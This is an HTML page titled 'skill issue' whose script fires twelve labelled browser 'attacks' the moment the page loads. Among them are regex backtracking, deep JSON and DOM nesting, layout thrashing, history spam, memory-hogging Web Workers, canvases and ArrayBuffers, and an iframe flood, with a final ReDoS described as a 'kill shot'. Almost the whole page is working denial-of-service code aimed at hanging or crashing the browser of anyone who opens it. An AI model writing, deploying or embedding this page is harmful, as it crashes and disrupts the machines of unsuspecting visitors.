<!DOCTYPE html>
<html>
<head>
<title>skill issue</title>
<style>body{background:#111;color:#0f0;font-family:monospace;padding:20px;font-size:12px}</style>
</head>
<body>
<pre id="o">=== SKILL ISSUE ===

Loading...</pre>
<script>
// Defer everything to ensure page renders first
window.onload = function(){
const o=document.getElementById('o');
const log=t=>{o.textContent+='\n'+t};
const store=[];
const safe=fn=>{try{fn()}catch(e){log('blocked: '+e.message)}};

log('Attacks starting...');

// Attack 1: ReDoS
function redosBomb(){
  log('ReDoS...');
  const patterns = [
    [/^(a+)+$/, 'a'.repeat(26)+'b'],
    [/^(a|aa)+$/, 'a'.repeat(26)+'b'],
    [/^(a+)+$/, 'a'.repeat(28)+'b'],
  ];
  patterns.forEach(([re,str])=>{try{re.test(str)}catch(e){}});
}

// Attack 2: Recursive JSON
function jsonBomb(){
  log('JSON bomb...');
  for(let k=0;k<5;k++){
    let obj={};let cur=obj;
    for(let i=0;i<100000;i++){cur.n={v:'x'.repeat(500)};cur=cur.n}
    try{const s=JSON.stringify(obj);store.push(s);JSON.parse(s)}catch(e){}
  }
}

// Attack 3: DOM depth bomb
function domDepthBomb(){
  log('DOM depth bomb...');
  for(let k=0;k<5;k++){
    let el=document.body;
    for(let i=0;i<3000;i++){
      const div=document.createElement('div');
      div.style.cssText='padding:1px;border:1px solid red;transform:rotate(0.1deg) scale(1.001);filter:blur(0.2px) brightness(1.01);box-shadow:0 0 5px red';
      el.appendChild(div);el=div;
    }
    for(let i=0;i<2000;i++){
      const span=document.createElement('span');
      span.textContent='X'.repeat(200);
      span.style.cssText='text-shadow:0 0 10px red,0 0 20px blue;filter:blur(1px)';
      el.appendChild(span);
    }
  }
}

// Attack 4: Layout thrashing
function layoutBomb(){
  log('Layout thrash...');
  function thrash(){
    document.querySelectorAll('*').forEach(d=>{
      void d.offsetWidth;void d.offsetHeight;void d.getBoundingClientRect();
      d.style.marginLeft=(Math.sin(Date.now()/50)*3)+'px';
      void d.offsetWidth;
      d.style.marginTop=(Math.cos(Date.now()/50)*3)+'px';
      void d.clientHeight;
      d.style.padding=(Math.abs(Math.sin(Date.now()/100)))+'px';
    });
    requestAnimationFrame(thrash);
  }
  for(let i=0;i<10;i++)requestAnimationFrame(thrash);
}

// Attack 5: History bomb
function historyBomb(){
  log('History bomb...');
  let i=0;
  function spam(){
    for(let j=0;j<5000;j++)history.pushState({x:i++},'','#'+i);
    setTimeout(spam,0);
  }
  for(let k=0;k<5;k++)spam();
}

// Attack 6: Worker bomb
function workerBomb(){
  log('Worker bomb...');
  const code=`const a=[];setInterval(()=>{const b=new Uint8Array(100*1024*1024);for(let i=0;i<b.length;i+=4096)b[i]=255;a.push(b)},1);`;
  for(let i=0;i<50;i++){
    try{store.push(new Worker(URL.createObjectURL(new Blob([code],{type:'application/javascript'}))))}catch(e){}
  }
}

// Attack 7: Iframe bomb
function iframeBomb(){
  log('Iframe bomb...');
  for(let i=0;i<100;i++){
    const iframe=document.createElement('iframe');
    iframe.style.cssText='width:200px;height:200px;position:absolute;left:'+Math.random()*innerWidth+'px;top:'+Math.random()*innerHeight+'px';
    iframe.srcdoc=`<style>*{animation:x 0.05s infinite;filter:blur(3px)}@keyframes x{to{transform:rotate(360deg) scale(1.5);filter:blur(10px)}}</style>`+'<div style="box-shadow:0 0 50px red">X</div>'.repeat(1000);
    document.body.appendChild(iframe);
  }
}

// Attack 8: CSS variable recursion
function cssVarBomb(){
  log('CSS variable bomb...');
  for(let k=0;k<10;k++){
    const style=document.createElement('style');
    let css=':root{';
    for(let i=0;i<2000;i++)css+=`--v${k}_${i}:calc(var(--v${k}_${(i+1)%2000}) + 1px);`;
    css+=`}div{width:var(--v${k}_0)}`;
    style.textContent=css;
    document.head.appendChild(style);
  }
}

// Attack 9: Mutation observer
function mutationBomb(){
  log('Mutation bomb...');
  const observer=new MutationObserver(muts=>{
    muts.forEach(()=>{
      for(let i=0;i<10;i++){
        const div=document.createElement('div');
        div.style.cssText='width:20px;height:20px;background:red;position:absolute;left:'+Math.random()*innerWidth+'px;top:'+Math.random()*innerHeight+'px;filter:blur(3px);animation:x 0.1s infinite;box-shadow:0 0 20px red';
        document.body.appendChild(div);
      }
    });
  });
  observer.observe(document.body,{childList:true,subtree:true,attributes:true});
  for(let i=0;i<500;i++)document.body.appendChild(document.createElement('span'));
}

// Attack 10: Canvas bomb
function canvasBomb(){
  log('Canvas bomb...');
  for(let i=0;i<30;i++){
    const c=document.createElement('canvas');
    c.width=c.height=8192;
    const ctx=c.getContext('2d');
    ctx.fillStyle='#f00';ctx.fillRect(0,0,8192,8192);
    const data=ctx.getImageData(0,0,8192,8192);
    for(let j=0;j<data.data.length;j+=4096)data.data[j]=255;
    store.push(data);store.push(c);
  }
}

// Attack 11: String bomb
function stringBomb(){
  log('String bomb...');
  let s='x';
  for(let i=0;i<28;i++){s+=s;store.push(s)}
}

// Attack 12: ArrayBuffer bomb
function arrayBomb(){
  log('ArrayBuffer bomb...');
  for(let i=0;i<50;i++){
    const a=new Uint8Array(200*1024*1024);
    for(let j=0;j<a.length;j+=4096)a[j]=255;
    store.push(a);
  }
}

// ALL ATTACKS FIRE
safe(canvasBomb);
safe(arrayBomb);
safe(stringBomb);
safe(domDepthBomb);
safe(iframeBomb);
safe(cssVarBomb);
safe(workerBomb);
safe(historyBomb);
safe(mutationBomb);
safe(layoutBomb);
safe(jsonBomb);

// ReDoS - the kill shot (after other attacks load the system)
setTimeout(()=>{
  log('skill issue detected...');
  /^(a+)+$/.test('a'.repeat(28)+'b');
},500);

};
</script>
</body>
</html>
